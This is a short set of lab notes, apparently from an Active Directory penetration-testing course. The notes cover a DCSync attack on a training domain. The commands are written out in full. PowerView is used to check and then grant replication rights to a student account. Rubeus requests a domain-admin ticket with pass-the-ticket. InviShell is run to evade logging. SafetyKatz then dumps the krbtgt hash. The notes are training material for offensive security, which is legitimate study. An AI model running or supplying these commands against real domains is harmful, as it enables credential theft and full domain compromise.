*Check if studentx has Replication (DCSync) rights.*
We can check with this command
```powershell
. C:\AD\Tools\PowerView.ps1
```
```powerview
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "<NOME UTENTE>"}
```
It doesn't return nothing, so we don't have priviledge
*add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user*
Create a session with a domain admin
```cmd
C:\AD\Tools\Rubeus.exe asktgt /user:<DOMAIN ADMIN> /aes256:<< /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Run invishell and import powerview
```cmd
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```
```powershell
. C:\AD\Tools\PowerView.ps1
```
add the permission to student115 
```powerview
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student115 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```
![[Pasted image 20231025125006.png]]
Let's check if now we have the permissions (use the previous command)
![[Pasted image 20231025125252.png]]
*execute the DCSync attack to pull hashes of the krbtgt user*
Now use safetykatz to extract the hash of any user
```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```
![[Pasted image 20231025125418.png]]